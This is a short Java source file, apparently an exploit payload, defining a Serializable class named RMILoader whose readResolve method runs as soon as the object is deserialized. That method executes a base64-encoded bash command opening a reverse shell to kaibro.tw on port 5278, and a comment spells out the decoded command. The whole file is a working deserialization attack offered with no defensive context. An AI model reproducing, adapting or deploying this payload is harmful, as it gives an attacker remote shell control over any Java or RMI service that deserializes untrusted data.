package kaibro;

import java.net.*;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.ObjectStreamException;
import java.io.Serializable;

public class RMILoader extends ClassLoader implements Serializable {
    private static final long serialVersionUID = 1;
    public Object readResolve() throws ObjectStreamException {
        try {
            Runtime r = Runtime.getRuntime();
            // bash -i >& /dev/tcp/kaibro.tw/5278 0>&1
            Process p = r.exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9rYWlicm8udHcvNTI3OCAwPiYx}|{base64,-d}|{bash,-i}");
            p.waitFor();
        } catch (Exception ex) {
            throw new RuntimeException(ex.toString());
        }
        return null;
    }

    public URL getResource(String name) {
        return getClass().getClassLoader().getResource(name);
    }
}
